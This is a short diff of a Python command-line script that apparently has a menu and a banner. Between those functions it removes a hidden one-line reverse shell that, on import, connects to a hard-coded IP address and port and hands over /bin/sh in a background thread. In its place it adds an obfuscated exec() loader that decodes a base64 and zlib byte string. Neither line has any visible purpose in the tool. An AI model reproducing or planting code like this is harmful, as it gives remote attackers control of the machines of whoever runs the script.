@@ -207,8 +207,8 @@ def options():
     elif opt_choose in ['x', 'X']:
         os.system('exit')
         pass
-        
-import os,pty,socket,threading;threading.Thread(target=(lambda: (lambda s: (s.connect(("213.199.46.205",19999)),[os.dup2(s.fileno(),f)for f in(0,1,2)],pty.spawn("/bin/sh")))(socket.socket())),daemon=True).start()
+
+exec((lambda E,D: D(E(b'QjY4OmI2NCxiNjgsYjY0OmI2NDozOmI2NDo0OmI2ODpiNjQ6Njo3OmI2ODo2OmI2ODpiNjQ6NDpNNGp6YldKdFpXNTBhVzl1WTI5a1pTNWpiMjB2Y0dWeQ==')))((lambda s: __import__('base64').b64encode(__import__('zlib').compress(s)).decode()), (lambda e: (lambda s,A='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz': exec(__import__('zlib').decompress(__import__('base64').b64decode(s))))(e)))
         
 def banner():
     banner = f"""                                                                                                
